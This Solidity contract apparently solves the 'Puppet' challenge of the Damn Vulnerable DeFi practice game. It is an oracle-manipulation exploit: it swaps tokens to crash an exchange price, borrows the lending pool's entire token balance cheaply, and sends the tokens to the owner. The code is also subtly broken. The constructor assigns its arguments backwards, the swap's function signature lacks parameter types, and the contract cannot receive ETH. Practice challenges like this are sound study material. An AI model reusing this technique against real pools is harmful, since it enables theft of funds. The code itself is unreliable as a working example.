// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";


contract PuppetAttacker {
    address public owner;
    address public poolAddr;
    address public tokenAddr;
    address public exchangeAddr;
    

    constructor(address a1, address a2, address a3) {
        owner = msg.sender;
        a1 = poolAddr;
        a2 = tokenAddr;
        a3 = exchangeAddr;
    }

    function attack(uint amount) public {
        require(msg.sender == owner, "onlyOwner");
        DamnValuableToken token = DamnValuableToken(tokenAddr);
        PuppetPool pool = PuppetPool(poolAddr);
        
        require(token.balanceOf(address(this)) >= amount, "token not enough");
        token.approve(exchangeAddr, amount);
        exchangeAddr.call(
            abi.encodeWithSignature(
                "tokenToEthSwapInput",
                amount,
                0,
                block.timestamp + 100
                )
        );

        pool.borrow{value:(address(this).balance)}(token.balanceOf(poolAddr));
        token.transfer(owner, token.balanceOf(address(this)));
    }
}